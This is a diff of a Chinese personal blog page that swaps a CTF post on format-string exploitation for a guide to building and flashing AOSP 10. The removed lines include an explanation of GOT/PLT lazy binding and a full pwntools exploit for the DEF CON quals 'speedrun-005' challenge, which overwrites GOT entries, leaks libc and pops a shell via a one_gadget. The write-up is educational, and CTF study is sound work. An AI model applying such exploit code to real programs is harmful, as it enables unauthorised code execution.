@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>pwner | 风云阁</title>
+  <title>AOSP刷机 | 风云阁</title>
   <meta name="keywords" content="">
-  <meta name="description" content="pwner | 风云阁">
+  <meta name="description" content="AOSP刷机 | 风云阁">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="MyGemspwntools gdb 调试脚本 attach_dbg_pie(io,brk_pts&#x3D;[],syms&#x3D;{},init_cmd&#x3D;[])  brk_pts （断点）和 syms （符号）的地址是低12位，可以在IDA中查看。 init_cmd ：gdb脚本，多行组成的列表。 from pwn import *  def attach_dbg_pie(io,brk_pts&#x3D;[],syms&#x3D;">
 <meta property="og:type" content="article">
@@ -396,9 +396,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Pwner" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-AOSP刷机" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">pwner</h1>
+        <h1 class="article-title">AOSP刷机</h1>
     
     <div class="article-meta">
         
@@ -408,7 +408,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-01-16 02:06:12'>2019-07-22 00:00</time>
+        创建时间:<time class="date" title='更新时间: 2020-07-04 18:25:09'>2020-01-16 02:06</time>
         
     </div>
     <div class="article-meta">
@@ -430,7 +430,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#格式化字符串"><span class="toc-text">格式化字符串</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#defcon-quals-oooctf-—-speedrun-005"><span class="toc-text">defcon quals oooctf — speedrun-005</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#tag-Mobile-AOSP"><span class="toc-text">tag:[Mobile,AOSP]</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AOSP-10刷机"><span class="toc-text">AOSP 10刷机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#下载"><span class="toc-text">下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编译"><span class="toc-text">编译</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#刷机-flash-images"><span class="toc-text">刷机 (flash images)</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -446,107 +446,31 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><pre><code>%[parameter][flags][field width][.precision][length]type
-
-</code></pre><p>Wiki-FMTstr</p>
-<p>[<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2]" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2]</a></p>
-<p>调试64位程序：</p>
-<p>linux ELF 程序用延迟绑定设计来加速动态链接库函数调用。lbc函数调用从function@plt开始，用gdb调试可清晰看到调用过程。function@got保存了寻找该函数的下一个跳转地址。</p>
-<pre><code># 用这个程序举例。
-int main()
-{
-    double a = 074;
-    printf(&quot;%1$o,%1$x,%2$o,%2$x&quot;,2333,6666);
-    return 0;
-}
-
-</code></pre><p>第一次调用printf，rip 跳到 prinf@plt </p>
-<pre><code>0x400530       &lt;printf@plt&gt;                      jmp    qword ptr [rip + 0x200af2] &lt;0x601028&gt;
-
-# 0x601028是printf@got。 存的值为0x400536</code></pre><p>继续查看跳转直到printf@got值为0x7fxxxxxxxxxxx的地址。</p>
-<p>跟踪路径得到 —&gt; dl_runtime_resolve_xsave —&gt; _dl_fixup</p>
-<pre><code>0x7f630d525b17 &lt;_dl_fixup+279&gt;                    mov    qword ptr [rbx], rax</code></pre><p>此处指令将 libc 的printf函数地址存放到printf@got中。绑定完成。</p>
-<p>下次调用printf，rip 跳转到 printf@plt —&gt; printf@got —&gt; printf@libc;</p>
-<h1 id="defcon-quals-oooctf-—-speedrun-005"><a href="#defcon-quals-oooctf-—-speedrun-005" class="headerlink" title="defcon quals oooctf — speedrun-005"></a>defcon quals oooctf — speedrun-005</h1><pre><code class="c">unsigned __int64 sub_40069D()
-{
-  char buf; // [rsp+0h] [rbp-410h]
-  unsigned __int64 v2; // [rsp+408h] [rbp-8h]
-
-  v2 = __readfsqword(0x28u);
-  printf(&quot;What do you mean this time? &quot;);
-  read(0, &amp;buf, 0x400uLL);
-  printf(&quot;Interesting &quot;, &amp;buf);
-  printf(&amp;buf);
-  puts(&quot; food for thought&quot;);
-  return __readfsqword(0x28u) ^ v2;
-}
-
-//printf(&amp;buf)
-//存在格式化字符串漏洞 </code></pre>
-<p>利用思路：</p>
-<ol>
-<li>hijack puts@got —&gt; func@0x40069D，获得多次read机会。</li>
-<li>leak read@got，得 one_gadgets 的内存地址。</li>
-<li>hijack puts@got —&gt; one_gadgets，弹shell，pwn掉。</li>
-</ol>
-<p>exp：</p>
-<pre><code class="python">#coding=utf8
-from pwn import *
-import plus_fmt as pft
-
-
-
-bn = process(&#39;./speedrun-005&#39;)
-
-debug = 1
-if debug:
-    context.log_level = &#39;debug&#39;
-    context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-    gdb.attach(bn)
-
-elf = ELF(&#39;./speedrun-005&#39;)
-libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
-read_libc = libc.symbols[&#39;read&#39;]
-puts_got = elf.got[&#39;puts&#39;]
-read_got = elf.got[&#39;read&#39;]
-printf_plt = elf.symbols[&#39;printf&#39;]
-printf_got = elf.got[&#39;printf&#39;]
-main_addr= 0x040069D
-vun_addr = 0x00400765
-one_addr = 0xf1147
-print &#39;printf:&#39;,hex(printf_got)
-
-offset = 6
-bn.recvuntil(&#39;his time? &#39;)
-
-tag = {puts_got:vun_addr}
-leak_can  = &#39;leee%7$s&#39;+p64(read_got)
-payload = pft.new_fmtstr_payload(6, tag, numbwritten=0,bits=64, write_size=&#39;short&#39;)
-bn.send(payload)
-sleep(0.05)
-payload = leak_can
-bn.sendline(payload)
-bn.recvuntil(&#39;Interesting &#39;)
-bn.recvuntil(&#39;Interesting &#39;)
-bn.recvuntil(&#39;leee&#39;)
-
-real_read = u64(bn.recv(6)+&#39;\x00\x00&#39;)
-libc_base = real_read- read_libc
-one = one_addr+libc_base
-print(hex(one))
-
-sleep(0.05)
-tag = {puts_got:one}
-payload = pft.new_fmtstr_payload(6, tag, numbwritten=0,bits=64, write_size=&#39;short&#39;)
-bn.sendline(payload)
-bn.interactive()
-</code></pre>
-<blockquote>
-<p>调试 </p>
-<p>in gdb: vmmap</p>
-<p>pmap <proc_id></proc_id></p>
-<p>ps -aux | grep <proc_name></proc_name></p>
-</blockquote>
+        <hr>
+<h2 id="tag-Mobile-AOSP"><a href="#tag-Mobile-AOSP" class="headerlink" title="tag:[Mobile,AOSP]"></a>tag:[Mobile,AOSP]</h2><p><div class='inner-toc'><h2>目录</h2><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#tag-Mobile-AOSP"><span class="toc-text">tag:[Mobile,AOSP]</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AOSP-10刷机"><span class="toc-text">AOSP 10刷机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#下载"><span class="toc-text">下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编译"><span class="toc-text">编译</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#刷机-flash-images"><span class="toc-text">刷机 (flash images)</span></a></li></ol></div></p>
+<h1 id="AOSP-10刷机"><a href="#AOSP-10刷机" class="headerlink" title="AOSP 10刷机"></a>AOSP 10刷机</h1><p>终于把项目完成了，抽空有时间把这篇博客补齐。以后学习重心从Linux转移到安卓的移动安全了。 </p>
+<p>macos 编译成功 AOSP 10 的过程，遇到几个编译异常，谷歌搜索好长一段时间才把问题解决。 </p>
+<p>我编译过两个版本，一个是最新的android-10，适配Pixel 3XL，另一个版本是 android-5.0，适配 Nexus 5。</p>
+<p>整个过程主要参考的<a href="https://source.android.com/" target="_blank" rel="noopener">官方文档</a>，由于代码仓库下载速度慢，改用国内镜像。这里推荐<a href="https://lug.ustc.edu.cn/wiki/mirrors/help/aosp" target="_blank" rel="noopener">中科大源</a>，下载没出任何意外。3个小时完成。</p>
+<p>工作机硬件配置是6核i7、16G内存，android-10 编译时长2.5个小时。android-5 的编译耗时40分钟。 </p>
+<p>写这篇博客记录AOSP下载、编译、刷机的完整过程，备忘。 主要内容记录的版本是 android-10，对 5 的过程稍加补充说明。</p>
+<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>找到手机支持的版本号 build。 这里我选择的是 – </p>
+<p><img src="/2020/01/16/AOSP%E5%88%B7%E6%9C%BA/image-20200704175023906.png" alt="image-20200704175023906"></p>
+<p>安装 repo 工具。</p>
+<p>home 目录创建 bin目录，其他地方也可以。 </p>
+<pre><code>mkdir ~/bin
+PATH=~/bin:$PATH</code></pre><p>下载，改权限。 </p>
+<pre><code>curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repo
+chmod a+x ~/bin/repo</code></pre><p>初始化repo，选择指定版本号build，这里使用中科大源，<strong>下载速度快很多</strong>。</p>
+<pre><code>repo init -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b $ANDROID_VERSION_CODE</code></pre><p>开始下载。 预计耗时3小时。 </p>
+<pre><code>repo sync</code></pre><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>使用 <code>envsetup.sh</code> 脚本初始化环境，此过程将导入若干命令。 </p>
+<pre><code>source build/envsetup.sh </code></pre><p>执行 <code>lunch</code> 命令，选择设备代号。</p>
+<pre><code>lunch</code></pre><p>执行 <code>make</code> 进行编译。 N参数表示线程数。 工作机6核12线程，N=12。</p>
+<pre><code>m -j12</code></pre><p>macOS 10.15 版本编译时候遇到 sepolicy 错误，需要改编译配置文件。 </p>
+<p>经过一番谷歌查找，找到此处。 修改一下继续编译。 </p>
+<h2 id="刷机-flash-images"><a href="#刷机-flash-images" class="headerlink" title="刷机 (flash images)"></a>刷机 (flash images)</h2><p>Google 的手机同时按音量下键和电源键，长按至进入<code>bootloader</code> 模式。</p>
+<pre><code>export 
+fastboot </code></pre><p>等待，开机后，一款很土的UI出现了，是的，这就是AOSP裸系统，哈哈哈。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论。 </span>
@@ -556,12 +480,12 @@ bn.interactive()
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>pwner</p>
+    <p><span class="copy-title">文章标题:</span>AOSP刷机</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="枫云李">枫云李</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-07-22, 00:00:00</p>
-    <p><span class="copy-title">最后更新:</span>2020-01-16, 02:06:12</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/07/22/Pwner/" title="pwner">https://primelyw.github.io/2019/07/22/Pwner/</a>
+    <p><span class="copy-title">发布时间:</span>2020-01-16, 02:06:12</p>
+    <p><span class="copy-title">最后更新:</span>2020-07-04, 18:25:09</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/01/16/AOSP%E5%88%B7%E6%9C%BA/" title="AOSP刷机">https://primelyw.github.io/2020/01/16/AOSP%E5%88%B7%E6%9C%BA/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
